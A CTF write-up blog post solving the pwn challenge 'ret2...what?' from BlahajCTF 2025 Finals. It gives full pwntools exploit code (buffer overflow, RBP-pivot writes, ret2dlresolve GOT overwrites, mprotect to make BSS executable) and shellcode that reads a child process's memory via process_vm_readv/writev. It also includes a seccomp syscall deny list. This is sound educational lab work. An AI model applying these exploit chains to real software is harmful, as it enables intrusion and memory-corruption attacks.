---
id: 3
title: "BlahajCTF 2025 Finals"
subtitle: "Writeup for the pwn challenge 'ret2...what?' by @FS in the BlahajCTF 2025 Finals"
date: "2025.12.14"
tags: "writeups"
---

This weekend, I participated in the BlahajCTF 2025 Finals. There were three pwn challengesin which I only solved one. 'ret2...what' by @baaaa_fs7 (FS) was a challenge I came close to solving, but could not within the time limit. After the competition, I went back and finished my solves. In this write-up, I will detail the intended solve, as well as an unintended one.

## Challenge Protections

```
[*] '/home/nikolawinata/Documents/ctf/blahaj/finals/ret2what/chall_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    RUNPATH:    b'.'
    Stripped:   No
```

PIE is disabled for this challenge, and there is Partial RELRO meaning GOT entries are writable.

## Challenge

The challenge provides us with two binaries: `chall` and `test`.

chall.c:
```c

// gcc -o chall chall.c -fno-stack-protector -no-pie -z relro -Wno-implicit-function-declaration -lseccomp
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <seccomp.h>
#include <unistd.h>

void cleanUp()
{
    char buf[0x150] = {0};
    // oneLastShot
    fgets(buf, 0x160, stdin);
    return;
}

void taunt()
{
    pid_t pid = fork();
    if (pid == 0)
    {
        execl("./test", "test", (char *)NULL);
        perror("execl failed");
    }
}

void seccomp_()
{
    int rc;
    scmp_filter_ctx ctx;
    char *boohoo = ":(";
    char *stra = "Load Failed %s\n";
    ctx = seccomp_init(SCMP_ACT_ALLOW);
    if (ctx == NULL)
    {
        perror("seccomp_init");
        exit(1);
    }

    int blocked_syscalls[] = {
        SCMP_SYS(pread64),
        SCMP_SYS(readv),
        SCMP_SYS(execve),
        SCMP_SYS(readlink),
        SCMP_SYS(readahead),
        SCMP_SYS(readlinkat),
        SCMP_SYS(preadv),
        SCMP_SYS(openat),
        SCMP_SYS(openat2),
        SCMP_SYS(open),
        SCMP_SYS(creat),
        SCMP_SYS(sendfile),
        SCMP_SYS(fork),
        SCMP_SYS(execveat),
        SCMP_SYS(sendfile),
        SCMP_SYS(preadv2),
    };

    for (size_t i = 0; i < sizeof(blocked_syscalls) / sizeof(blocked_syscalls[0]); i++)
    {
        rc = seccomp_rule_add(ctx, SCMP_ACT_KILL_PROCESS, blocked_syscalls[i], 0);
        if (rc < 0)
        {
            fprintf(stderr, "Failed to block syscall %d\n", blocked_syscalls[i]);
            seccomp_release(ctx);
            exit(1);
        }
    }
    rc = seccomp_load(ctx);
    if (rc < 0)
    {
        perror("seccomp_load");
        fprintf(stderr, stra, boohoo);
        seccomp_release(ctx);
        cleanUp();
    }

    seccomp_release(ctx);
}

int main()
{
    char buf[0x100];
    char s[] = "Have you heard of 'Don't Tap the Glass'?\n";
    int n = 10;
    taunt();
    seccomp_();
    memset(s, (short)n, n);
    fgets(buf, 0x150, stdin);
    return 0;
}
```

When the binary is run, the program first forks and runs the `test` binary. Afterwards, it sets up a seccomp filter that blacklists `execve` family syscalls, as well as the `open` family syscalls.

Finally, the program gives a straightforward buffer overflow to ROP.

In the seccomp setup function, there is a branch of code that calls `fprintf()` and then a `cleanUp()` function that gives us yet another buffer overflow.  


test.c
```c
#include <sys/mman.h>
#include <stdio.h>
#include <unistd.h>
#include <stdbool.h>
#include <fcntl.h>
#include <sched.h>

#include <string.h>

int main()
{
    alarm(0x1a);
    size_t size = 4096;

    void *ptr = mmap(NULL, size,
                     PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS,
                     -1, 0);

    if (ptr == MAP_FAILED)
    {
        perror("mmap");
        return 1;
    }

    printf("Memory mapped at %p\n", ptr);
    pid_t pid = getpid();
    printf("PID: %d\n", pid);
    *(char *)ptr = 0x41;
    while (*(char *)ptr == 0x41)
    {
        usleep(100000);
    }
    char buf[0x100];
    int fd = open("./flag", O_RDONLY);
    read(fd, buf, 0x100);
    memcpy(ptr, buf, 0x30);
    sleep(10);
}
```

The `test` binary `mmap()`s a writable region where a 0x41 byte is written. While the value of that byte is 0x41, the program goes into a loop with a `usleep()`. When the value of the byte is not 0x41, the program finally opens the flag file and reads it into the chunk. 

Both the PID and address of the memory region are given to us.

Hence, the main goal will be to somehow exfiltrate the flag from the child `test` process without using `open()` syscalls.

## Attack Strategy

I kinda threw at this part because I was fumbling around on what to do, this was quite a novel challenge (and a fun one in the end!). Eventually, I took note of a few things (and some things that FS enlightened me to):

1. There is partial RELRO, but no `puts()` or `printf()` call, meaning we can't leak LIBC but we can perform a [Ret2dlresolve attack](https://ir0nstone.gitbook.io/notes/binexp/stack/ret2dlresolve/)
2. Conveniently, `fprintf()` takes in 3 arguments, just as `mprotect()` does! I did not notice this during the CTF, but it was only after FS told me this that I realised my solve path could have been easier. If we could control the pointer in the `stderr` global variable, as well as the two other arguments (relative to RBP), we can control where to create an `rwx` region for shellcode.

My attack path was the following:

1. Perform a manual ret2dlresolve attack to replace the `fprintf()` and `seccomp_release()` GOT entries with `mprotect()` and `puts()` respectively
2. Afterwards, jump to the part in `seccomp_()` that calls our `fprintf` as `mprotect` and gives us the buffer overflow to finally write our shellcode.
3. Somehow exfiltrate the flag?

Even with this general solve path, there is still a question to remain - how can we read and write to the child process' memory without using the `open` syscall?

### process_vm_readv and process_vm_writev

In the linux syscall table, there are two syscalls that allow read/write to a process with just its PID:

1. `process_vm_readv`, which reads bytes from the process to its callee process
2. `process_vm_writev`, which writes bytes from the callee process to the process of choice

From the man-page, `process_vm_readv` and `process_vm_writev` are called as follows:

`process_vm_readv`:
```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <sys/types.h>
#include <sys/uio.h>

int
main(void)
{
    char          buf1[10];
    char          buf2[10];
    pid_t         pid = 10;    /* PID of remote process */
    ssize_t       nread;
    struct iovec  local[2];
    struct iovec  remote[1];

    local[0].iov_base = buf1;
    local[0].iov_len = 10;
    local[1].iov_base = buf2;
    local[1].iov_len = 10;
    remote[0].iov_base = (void *) 0x10000;
    remote[0].iov_len = 20;

    nread = process_vm_readv(pid, local, 2, remote, 1, 0);
    if (nread != 20)
        exit(EXIT_FAILURE);

    exit(EXIT_SUCCESS);
}
```

`process_vm_writev`
```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <sys/types.h>
#include <sys/uio.h>

int
main(void)
{
    char          buf1[10];
    char          buf2[10];
    pid_t         pid = 10;    /* PID of remote process */
    ssize_t       nread;
    struct iovec  local[2];
    struct iovec  remote[1];

    local[0].iov_base = buf1;
    local[0].iov_len = 10;
    local[1].iov_base = buf2;
    local[1].iov_len = 10;
    remote[0].iov_base = (void *) 0x10000;
    remote[0].iov_len = 20;

    nread = process_vm_writev(pid, local, 2, remote, 1, 0);
    if (nread != 20)
        exit(EXIT_FAILURE);

    exit(EXIT_SUCCESS);
}
```

Both take in the PID, an `iovec` struct consisting of the buffer and its length for the local process and the remote process, as well as the `liovcnt` that determines the number of bytes written or read, as well as the `riovcnt` and some flags.

Hence, we can write shellcode that sets the arguments, creates the `iovec` structures and calls the syscalls for us to write to and read from the child process' memory.

### Pivoting to Write

As there are no more `pop rdi`, `pop rsi`, or `pop rdx` gadgets following the removal of `__libc_csu_init` in GCC-compiled binaries after GLIBC 2.34, we cannot use our standard ROP chain of utilising pops to set registers and call functions.

Instead, we will have to perform a more restricted form of ROP, using chains within the pre-existing functions that set the registers for us using offsets from RBP.

Notice, in `main()`:

```asm
   0x000000000040149c <+169>:	mov    rdx,QWORD PTR [rip+0x2bdd]        # 0x404080 <stdin@GLIBC_2.2.5>
   0x00000000004014a3 <+176>:	lea    rax,[rbp-0x110]
   0x00000000004014aa <+183>:	mov    esi,0x150
   0x00000000004014af <+188>:	mov    rdi,rax
   0x00000000004014b2 <+191>:	call   0x401080 <fgets@plt>
   0x00000000004014b7 <+196>:	mov    eax,0x0
   0x00000000004014bc <+201>:	leave
   0x00000000004014bd <+202>:	ret
```

As `rdi` is set by an offset of `rbp`, we can actually achieve an __arbitrary write__ by controlling `rbp`. 

When `leave; ret` executes, the following actually occurs:

```asm
mov rsp, rbp
pop rbp
```

Hence, the value of `rbp` is modified to the value it was __pointing__ to initially. This gives us a way to control the value of `rbp` by modifiying its saved value.

We can also use the default `__do_global_dtors_aux` gadget:
```asm
   0x4011ad <__do_global_dtors_aux+29>:	pop    rbp
   0x4011ae <__do_global_dtors_aux+30>:	ret
```

to set `rbp` in between ROP chains.

However, the risk of jumping back into the user-defined functions is that we pivot `rsp` as well, due to the `leave; ret` instructions at the end. Hence, each pivot of `rbp` must consequentially be able to control the return address `rbp+8` to maintain execution flow.

### Setting up Ret2dlresolve

With this in mind, we can use our "arbitrary write" ROP to forge the structures for Ret2dlresolve. We first initialise our structure payloads with pwntool's utilities:

```python
dlresolve1 = Ret2dlresolvePayload(elf, symbol='mprotect', args=[], data_addr=data_addr1+0x30)

elf64_rel = dlresolve1.payload[-24:]
elf64_rel = p64(elf.got.fprintf) + elf64_rel[8:]
resolve_payload1 = dlresolve1.payload[:-24] + elf64_rel

dlresolve2 = Ret2dlresolvePayload(elf, symbol='puts', args=[], data_addr=data_addr2+0x30)
elf64_rel = dlresolve2.payload[-24:]
elf64_rel = p64(elf.got.seccomp_release) + elf64_rel[8:]
resolve_payload2 = dlresolve2.payload[:-24] + elf64_rel
```

We will modify the default payloads to replace the GOT entries of `fprintf` and `seccomp_release` (so we don't segfault after our `fprintf` in `seccomp_()`) upon linking via `dlresolve`, as well as the `data_addr` that will point to the location of our `resolve_payload`s. Now, we can use our buffer overflow to write our first dlresolve payload:

```python
rop1 = ROP(elf)
rop1.raw(b'A'*0x118)
rop1.rbp = data_addr1+0x110
rop1.raw(0x000000000040149c)

sleep(0.5)
p.sendline(rop1.chain())

rop1 = ROP(elf)
rop1.raw(b'A'*8)
rop1.raw(rop.chain())
rop1.rbp = data_addr2+0x110
rop1.raw(0x40149c)
rop1.raw(resolve_payload1)
rop1.raw(b'A'*(0x118-len(rop1.chain())))
rop1.rbp = data_addr1
rop1.raw(next(elf.search(asm('leave; ret'))))

sleep(0.5)
p.sendline(rop1.chain())
```

First, we set `rbp` to be our "where" address to write to, but with an added 0x110 to account for the RBP offset in `0x40149c`. This is so we can jump here:

```asm
   0x000000000040149c <+169>:	mov    rdx,QWORD PTR [rip+0x2bdd]        # 0x404080 <stdin@GLIBC_2.2.5>
   0x00000000004014a3 <+176>:	lea    rax,[rbp-0x110]
   0x00000000004014aa <+183>:	mov    esi,0x150
   0x00000000004014af <+188>:	mov    rdi,rax
   0x00000000004014b2 <+191>:	call   0x401080 <fgets@plt>
```

Giving us a write to our target address. After our write, we will want to ret2dlresolve with the standard pwntools ROP chain for doing as such so we can successfully link `mprotect` to our chosen `fprintf` GOT entry. Hence, we pivot to the beginning of our buffer where the ret2dlresolve chain lies. Afterwards, we will want to set-up the write for our second `resolve_payload`. 

Hence, using `pop rbp; ret`, we set `rbp` to point to the second target address with the added offset. Then we do the same thing again:

```python
rop = ROP(elf)
rop.ret2dlresolve(dlresolve2)

rop1 = ROP(elf)
rop1.raw(b'A'*8)
rop1.raw(rop.chain())
rop1.rbp = 0x4040a0+0x110
rop1.raw(0x40149c)
rop1.raw(resolve_payload2)
rop1.raw(b'A'*(0x118-len(rop1.chain())))
rop1.rbp = data_addr2
rop1.raw(next(elf.search(asm('leave; ret'))))

sleep(0.5)
p.sendline(rop1.chain())
```

### Getting an RWX map on BSS

Now that we have successfully replaced `fprintf` and `seccomp_release` with `mprotect` and `puts` respectively, we can finally jump to this part of `seccomp_` to get our RWX region and eventually write our shellcode:

```asm
   0x00000000004013af <+350>:	mov    rax,QWORD PTR [rip+0x2cea]        # 0x4040a0 <stderr@GLIBC_2.2.5>
   0x00000000004013b6 <+357>:	mov    rdx,QWORD PTR [rbp-0x10]
   0x00000000004013ba <+361>:	mov    rcx,QWORD PTR [rbp-0x18]
   0x00000000004013be <+365>:	mov    rsi,rcx
   0x00000000004013c1 <+368>:	mov    rdi,rax
   0x00000000004013c4 <+371>:	mov    eax,0x0
   0x00000000004013c9 <+376>:	call   0x401090 <fprintf@plt>
   0x00000000004013ce <+381>:	mov    rax,QWORD PTR [rbp-0x20]
   0x00000000004013d2 <+385>:	mov    rdi,rax
   0x00000000004013d5 <+388>:	call   0x401060 <seccomp_release@plt>
   0x00000000004013da <+393>:	mov    eax,0x0
   0x00000000004013df <+398>:	call   0x4011c6 <cleanUp>
   0x00000000004013e4 <+403>:	mov    rax,QWORD PTR [rbp-0x20]
   0x00000000004013e8 <+407>:	mov    rdi,rax
   0x00000000004013eb <+410>:	call   0x401060 <seccomp_release@plt>
   0x00000000004013f0 <+415>:	nop
   0x00000000004013f1 <+416>:	leave
   0x00000000004013f2 <+417>:	ret
```

Notice that the first argument of `fprintf()` is the `stderr` global variable, with the second and third arguments being offsets of `rbp`. As we want the `mprotect` call to map the BSS region to be RWX, we will need to perform a third arbitrary write to modify the value of `stderr` from the actual `_IO_2_1_stderr_` to the address of the BSS:

```python
rop1 = ROP(elf)
rop1.raw(b'A'*8)
rop1.raw(rop.chain())
rop1.rbp = 0x4040a0+0x110 # We pivot back 
rop1.raw(0x40149c)
rop1.raw(resolve_payload2)
rop1.raw(b'A'*(0x118-len(rop1.chain())))
rop1.rbp = data_addr2
rop1.raw(next(elf.search(asm('leave; ret'))))

sleep(0.5)
p.sendline(rop1.chain())

rop1 = flat({
    0x0: 0x404000,
    0x110: [0x404f00, 0x40149c]
})

sleep(0.5)
p.sendline(rop1)

```

Now, we pivot to a bogus address and jump back to the write chain in `main()` to set our second and third arguments for `mprotect`.

Recall that the second and third arguments of `fprintf` are determined by offsets of `rbp`:
```asm
   0x00000000004013b6 <+357>:	mov    rdx,QWORD PTR [rbp-0x10]
   0x00000000004013ba <+361>:	mov    rcx,QWORD PTR [rbp-0x18]
   0x00000000004013be <+365>:	mov    rsi,rcx
   0x00000000004013c1 <+368>:	mov    rdi,rax
   0x00000000004013c4 <+371>:	mov    eax,0x0
   0x00000000004013c9 <+376>:	call   0x401090 <fprintf@plt>
```

Hence, we set the arguments accordingly with our write before we jump back to `seccomp_`:

```python
rop1 = flat({
    0x110-0x20: [0x404000, 0x1000, 0x7],
    0x110: [0x404f00, 0x4013af]
})

sleep(0.5)
p.sendline(rop1)
```

After the `mprotect` call, our BSS region is now executable and writable!

![executable](/images/2025-12-14-10-48-19.png)

This puts us in position to write our shellcode on the BSS with the `cleanUp()` function:

```c
void cleanUp()
{
    char buf[0x150] = {0};
    // oneLastShot
    fgets(buf, 0x160, stdin);
    return;
}
```

### Shellcode on the BSS, Flag on the mmap

Let's write some shellcode :D however I am horrible at shellcode so I will not explain much, the idea is basically to set the `iovec` arguments to point to some random part of the BSS, and then set them by incrementing the registers by 8 and modifying them in place. We also perform a `usleep` syscall after writing our byte to the memory region on the child process so it has time to open and read the flag onto the buffer.

```python
sc = asm(f'''
mov rax, 0x137 /* process_vm_writev
mov rdi, {pid}

mov rsi, 0x404ab0
mov rbx, {0x404ab0 + 0x10}
mov qword ptr [rsi], rbx
mov rcx, rsi
add rcx, 8
mov qword ptr [rcx], 0x1 
add rcx, 8
mov qword ptr [rcx], 0x61

mov rdx, 1             

mov r10, {0x404ab0 + 0x50}
mov rcx, {mem}
mov qword ptr [r10], rcx
mov rbx, r10
add rbx, 8
mov rcx, 0x1
mov qword ptr [rbx], rcx  

mov r8, 1               
mov r9, 0               
syscall

mov rax, 35  /* usleep!!
mov rdi, 0x404200
mov qword ptr [rdi], 1
mov rcx, rdi
add rcx, 8
mov qword ptr [rcx], 0
xor rsi, rsi
syscall

mov rax, 0x136 /* process_vm_readv
mov rdi, {pid}

mov rsi, 0x404ab0
mov rbx, {0x404ab0 + 0x10}
mov qword ptr [rsi], rbx
mov rbx, rsi
add rbx, 8
mov rcx, 0x30
mov qword ptr [rbx], rcx

mov rdx, 1               
mov r10, {0x404ab0 + 0x50}
mov rbx, {mem}
mov qword ptr [r10], rbx
mov rcx, r10
add rcx, 8
mov rbx, 0x30
mov qword ptr [rcx], rbx 

mov r8, 1                 
mov r9, 0                 
syscall

mov rax, {constants.SYS_write}
mov rdi, 1
mov rsi, {0x404ab0+0x10}
mov rdx, 0x30
syscall
''')

sleep(0.5)
p.send(sc)
```

However, this has bad-bytes because of the newline (0xa) character! Hence, we write a stager shellcode to call `SYS_read` on the shellcode region to write our actual shellcode:

```python
sc_addr = 0x404db0
read_sc = asm(f'''
mov rax, {constants.SYS_read}
mov rdi, 0
mov rsi, {sc_addr-0x200}
mov rdx, 0x1000
syscall
mov rax, {sc_addr-0x200}
call rax
''')

sleep(0.5)
p.sendline(read_sc.ljust(0x158, b'\x90')+p64(sc_addr))

sc = asm(f'''
mov rax, 0x137
mov rdi, {pid}

mov rsi, 0x404ab0
mov rbx, {0x404ab0 + 0x10}
mov qword ptr [rsi], rbx
mov rcx, rsi
add rcx, 8
mov qword ptr [rcx], 0x1 
add rcx, 8
mov qword ptr [rcx], 0x61

mov rdx, 1             

mov r10, {0x404ab0 + 0x50}
mov rcx, {mem}
mov qword ptr [r10], rcx
mov rbx, r10
add rbx, 8
mov rcx, 0x1
mov qword ptr [rbx], rcx  

mov r8, 1               
mov r9, 0               
syscall

mov rax, 35
mov rdi, 0x404200
mov qword ptr [rdi], 1
mov rcx, rdi
add rcx, 8
mov qword ptr [rcx], 0
xor rsi, rsi
syscall

mov rax, 0x136
mov rdi, {pid}

mov rsi, 0x404ab0
mov rbx, {0x404ab0 + 0x10}
mov qword ptr [rsi], rbx
mov rbx, rsi
add rbx, 8
mov rcx, 0x30
mov qword ptr [rbx], rcx

mov rdx, 1               
mov r10, {0x404ab0 + 0x50}
mov rbx, {mem}
mov qword ptr [r10], rbx
mov rcx, r10
add rcx, 8
mov rbx, 0x30
mov qword ptr [rcx], rbx 

mov r8, 1                 
mov r9, 0                 
syscall

mov rax, {constants.SYS_write}
mov rdi, 1
mov rsi, {0x404ab0+0x10}
mov rdx, 0x30
syscall
''')

sleep(0.5)
p.send(sc)
```

This gives us the flag!
![flag](/images/2025-12-14-10-58-51.png)

## The Unintended Way 

This solution is not dissimilar from the intended in that both use `mprotect` in the end to write shellcode.
The target of interest is this unintended `memset` call left by the author:

```asm
   0x000000000040148b <+152>:	lea    rax,[rbp-0x140]
   0x0000000000401492 <+159>:	mov    esi,ecx
   0x0000000000401494 <+161>:	mov    rdi,rax
   0x0000000000401497 <+164>:	call   0x401070 <memset@plt>
   0x000000000040149c <+169>:	mov    rdx,QWORD PTR [rip+0x2bdd]        # 0x404080 <stdin@GLIBC_2.2.5>
   0x00000000004014a3 <+176>:	lea    rax,[rbp-0x110]
   0x00000000004014aa <+183>:	mov    esi,0x150
   0x00000000004014af <+188>:	mov    rdi,rax
   0x00000000004014b2 <+191>:	call   0x401080 <fgets@plt>
   0x00000000004014b7 <+196>:	mov    eax,0x0
   0x00000000004014bc <+201>:	leave
   0x00000000004014bd <+202>:	ret
```

Because of this, we can instead use one ret2dlresolve to replace `memset()` with `puts()`, and then set our `rbp` to point to the `fgets` GOT entry with the added offset. This gives us a LIBC leak, that we can eventually use to stage an `mprotect` chain on the LIBC writable area:

```python
p.recvuntil(b'mapped at ')
mem = int(p.recvline().strip(), 16)
log.info("mem, %#x", mem)
p.recvuntil(b'PID: ')
pid = int(p.recvline().strip())

dlresolve = Ret2dlresolvePayload(elf, symbol='puts', args=[], data_addr=data_addr+0x30)

elf64_rel = dlresolve.payload[-24:]
elf64_rel = p64(elf.got.memset) + elf64_rel[8:]
resolve_payload = dlresolve.payload[:-24] + elf64_rel

print(len(resolve_payload))

rop = ROP(elf)
rop.ret2dlresolve(dlresolve)

print(rop.dump())

rop1 = ROP(elf)
rop1.raw(b'A'*0x118)
rop1.rbp = data_addr+0x110
rop1.raw(0x000000000040149c)

sleep(0.5)
p.sendline(rop1.chain())

rop1 = ROP(elf)
rop1.raw(b'A'*8)
rop1.raw(rop.chain())
rop1.rbp = elf.got.fgets+0x140
rop1.raw(0x40148b)
rop1.raw(resolve_payload)
rop1.raw(b'A'*(0x118-len(rop1.chain())))
rop1.rbp = data_addr
rop1.raw(next(elf.search(asm('leave; ret'))))

sleep(0.5)
p.sendline(rop1.chain())

p.recv(1)
libc.address = u64(p.recv(6)+b'\0'*2) - libc.sym.fgets
log.info("libc.address, %#x", libc.address)
```

From there, it was possible to avoid using the usleep syscall and instead opt for the LIBC sleep:

```python
sc = asm(f'''
mov rax, 0x137
mov rdi, {pid}

mov rsi, 0x404ab0
mov rbx, {0x404ab0 + 0x10}
mov qword ptr [rsi], rbx
mov rcx, rsi
add rcx, 8
mov qword ptr [rcx], 0x1 
add rcx, 8
mov qword ptr [rcx], 0x61

mov rdx, 1             

mov r10, {0x404ab0 + 0x50}
mov rcx, {mem}
mov qword ptr [r10], rcx
mov rbx, r10
add rbx, 8
mov rcx, 0x1
mov qword ptr [rbx], rcx  

mov r8, 1               
mov r9, 0               
syscall

mov rax, {libc.sym.sleep}
mov rdi, 0x1
call rax

mov rax, 0x136
mov rdi, {pid}

mov rsi, 0x404ab0
mov rbx, {0x404ab0 + 0x10}
mov qword ptr [rsi], rbx
mov rbx, rsi
add rbx, 8
mov rcx, 0x30
mov qword ptr [rbx], rcx

mov rdx, 1               
mov r10, {0x404ab0 + 0x50}
mov rbx, {mem}
mov qword ptr [r10], rbx
mov rcx, r10
add rcx, 8
mov rbx, 0x30
mov qword ptr [rcx], rbx 

mov r8, 1                 
mov r9, 0                 
syscall

mov rax, {constants.SYS_write}
mov rdi, 1
mov rsi, {0x404ab0+0x10}
mov rdx, 0x30
syscall
''')


sleep(0.5)
p.send(sc)
```

## Thoughts and Conclusions

All in all, this was one of the most creative ROP problems I've tried! The concept of using ret2dlresolve not to get a shell with a straightforward `system()` but rather to stage the next part of the attack leading to shellcode was a very innovative challenge setup.

With regards to the pwn meta of local CTFs, FS's challenge has really given a refreshing look on local pwn, one that isn't just ret2libc or UAF slop. His challenges in the qualifiers as well as the finals were unique and fun. I rate the pwn challenges from this particular CTF a 10/10.
